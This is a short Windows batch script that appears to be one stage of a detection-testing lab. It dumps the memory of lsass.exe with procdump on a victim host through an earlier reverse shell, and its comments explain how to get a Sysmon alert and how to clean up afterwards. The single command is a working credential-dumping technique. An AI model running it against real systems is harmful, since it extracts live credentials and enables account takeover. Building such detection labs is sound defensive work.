:: Stage 8b — Credential Access, LSASS (T1003.001)
:: Host: Windows 11 victim, run through the reverse shell established in Stage 8
:: procdump.exe must be pre-staged on the victim beforehand
:: (download separately: https://live.sysinternals.com/procdump.exe —
:: do NOT download it live through the reverse shell, it adds a network
:: event that pollutes the evidence).
::
:: PREREQUISITE (docs/04, Stage 8b analysis): Sysmon's ProcessAccess (Event ID 10)
:: section must be enabled with a filter on lsass.exe, or no event — and no
:: alert — will be produced. See endpoints/windows-11/sysmon_config.xml.

procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_test.dmp

:: Cleanup after the test (the dump contains live credential material):
:: del C:\Windows\Temp\lsass_test.dmp
